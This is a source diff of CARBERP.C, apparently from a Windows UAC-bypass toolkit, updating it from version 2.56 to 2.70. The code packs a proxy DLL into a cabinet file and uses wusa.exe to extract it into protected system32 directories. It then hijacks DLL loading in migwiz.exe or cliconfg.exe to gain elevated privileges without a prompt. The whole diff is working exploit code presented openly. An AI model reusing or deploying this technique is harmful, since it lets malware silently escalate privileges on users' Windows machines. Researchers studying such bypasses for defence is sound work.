@@ -4,9 +4,9 @@
 *
 *  TITLE:       CARBERP.C
 *
-*  VERSION:     2.56
+*  VERSION:     2.70
 *
-*  DATE:        15 Feb 2017
+*  DATE:        25 Mar 2017
 *
 *  Tweaked Carberp methods.
 *  Original Carberp is exploiting mcx2prov.exe in ehome.
@@ -26,28 +26,42 @@
 * Purpose:
 *
 * Extract cab to protected directory using wusa.
+* This routine expect source as ellocnak.msu cab file in the temp folder.
 *
 */
 BOOL ucmWusaExtractPackage(
-    LPWSTR lpCommandLine
-    )
+    _In_ LPWSTR lpTargetDirectory
+)
 {
     BOOL bResult = FALSE;
+    SIZE_T Size;
+    LPWSTR lpCommandLine = NULL;
     WCHAR szMsuFileName[MAX_PATH * 2];
-    WCHAR szCmd[MAX_PATH * 4];
+
+    if (lpTargetDirectory == NULL)
+        return FALSE;
 
     RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));
     _strcpy(szMsuFileName, g_ctx.szTempDirectory);
     _strcat(szMsuFileName, ELLOCNAK_MSU);
 
-    //extract msu data to target directory
-    RtlSecureZeroMemory(szCmd, sizeof(szCmd));
-    wsprintfW(szCmd, lpCommandLine, szMsuFileName);
-    bResult = supRunProcess(L"cmd.exe", szCmd);
+    Size = ((1 + _strlen(lpTargetDirectory) + 
+        _strlen(szMsuFileName) + 
+        MAX_PATH) * sizeof(WCHAR));
 
-    if (szMsuFileName[0] != 0) {
-        DeleteFileW(szMsuFileName);
+    lpCommandLine = (LPWSTR)supHeapAlloc(Size);
+    if (lpCommandLine) {
+
+        _strcpy(lpCommandLine, L"/c wusa ");
+        _strcat(lpCommandLine, szMsuFileName);
+        _strcat(lpCommandLine, L" /extract:");
+        _strcat(lpCommandLine, lpTargetDirectory);
+
+        bResult = supRunProcess(CMD_EXE, lpCommandLine);
+
+        supHeapFree(lpCommandLine);
     }
+    DeleteFileW(szMsuFileName);
     return bResult;
 }
 
@@ -60,37 +74,43 @@ BOOL ucmWusaExtractPackage(
 *
 */
 BOOL ucmWusaMethod(
-    UACBYPASSMETHOD Method,
+    _In_ UCM_METHOD Method,
     PVOID ProxyDll,
     DWORD ProxyDllSize
-    )
+)
 {
     BOOL   bResult = FALSE, cond = FALSE;
-    LPWSTR lpCommandLine;
     WCHAR  szSourceDll[MAX_PATH * 2];
     WCHAR  szTargetProcess[MAX_PATH * 2];
+    WCHAR  szTargetDirectory[MAX_PATH * 2];
 
     if ((ProxyDll == NULL) || (ProxyDllSize == 0)) {
         return FALSE;
     }
 
     _strcpy(szTargetProcess, g_ctx.szSystemDirectory);
+    _strcpy(szTargetDirectory, g_ctx.szSystemDirectory);
     _strcpy(szSourceDll, g_ctx.szTempDirectory);
 
     switch (Method) {
 
-        //use migwiz.exe as target
+    // 
+    // Use migwiz.exe as target.
+    // szTargetDirectory is system32\migwiz
+    //
     case UacMethodCarberp1:
         _strcat(szSourceDll, WDSCORE_DLL);
-        lpCommandLine = CMD_EXTRACT_MIGWIZ;
+        _strcat(szTargetDirectory, MIGWIZ_DIR);
         _strcat(szTargetProcess, MIGWIZ_DIR);
         _strcat(szTargetProcess, MIGWIZ_EXE);
         break;
 
-        //use cliconfg.exe as target
+    //
+    // Use cliconfg.exe as target.
+    // szTargetDirectory is system32
+    //
     case UacMethodCarberp2:
-        _strcat(szSourceDll, NTWDBLIB_DLL);
-        lpCommandLine = CMD_EXTRACT_SYSTEM32;
+        _strcat(szSourceDll, NTWDBLIB_DLL);       
         _strcat(szTargetProcess, CLICONFG_EXE);
         break;
 
@@ -113,7 +133,7 @@ BOOL ucmWusaMethod(
             break;
         }
 
-        if (!ucmWusaExtractPackage(lpCommandLine)) {
+        if (!ucmWusaExtractPackage(szTargetDirectory)) {
             break;
         }
 
@@ -135,19 +155,19 @@ BOOL ucmWusaMethod(
 *
 */
 BOOL ucmCreateCabinetForSingleFile(
-    LPWSTR lpSourceDll,
-    PVOID ProxyDll,
-    DWORD ProxyDllSize
-    )
+    _In_ LPWSTR lpSourceDll,
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
 {
     BOOL     cond = FALSE, bResult = FALSE;
     CABDATA *Cabinet = NULL;
     LPWSTR   lpFileName;
     WCHAR    szMsuFileName[MAX_PATH * 2];
 
-    if ((ProxyDll == NULL) || (ProxyDllSize == 0)) {
-        return FALSE;
-    }
+    if ((ProxyDll == NULL) || 
+        (ProxyDllSize == 0) ||
+        (lpSourceDll == NULL)) return bResult;
 
     do {
 
